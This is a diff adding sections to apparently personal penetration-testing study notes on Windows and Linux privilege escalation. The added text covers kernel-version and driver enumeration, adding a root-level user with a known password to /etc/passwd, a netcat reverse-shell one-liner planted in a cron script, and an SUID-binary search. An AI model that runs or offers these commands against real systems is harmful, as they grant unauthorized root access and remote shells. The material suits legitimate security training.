@@ -119,3 +119,46 @@ C:\Program Files\My Program\My.exe
 C:\Program Files\My Program\My service\service.exe
 All you have to do is write an executable and put it in one of the 
 attempted paths and it will run first. 
+
+Kernel Vulns:
+Just like UAC techs, you need to enumerate kernel versions to get the right 
+kernel vulns. You can very easily BSOD an endpoint so enumerate before 
+you shoot.
+
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+driverquery /v 
+type <dir>.inf (Shows dir info)
+
+Good commands for this. Search exploits for the drivers and kernel version.
+You may have to compile and transfer exploits at this level because most 
+of them are C/CPP code. 
+
+LINUX PRIVESC TECHS:
+Linux lists everything in terminal and gives rwx perms based on root, group 
+and user. 
+
+Read the crontab, and look at /var/log/cron.log 
+You can often write scripts that are run automatically on the computer.
+
+If you have write permissions to /etc/passwd you can store hashses in there
+that are considered valid for authentication. Here is how you would do that:
+
+openssl passwd evil
+echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
+student@debian:~$ su root2
+Password: evil
+
+Using openssl to passwd hash 'evil' you can append the user 'root2' and 
+the new password hash to be able to su to them. the UID and GID values
+of 0 tell the system that our new user is a superuser account. 
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
+^Fun shell 1-liner to throw in cronjobs.
+
+gcc -static will fix GLIBC issues.
+
+find / -perm -u=s -type f 2>/dev/null
+Finds all suid binaries
+
+Use gtfo bins. If you search with +sudo or +suid you can
+filter based on bins where those permissions are hepful or relevant.
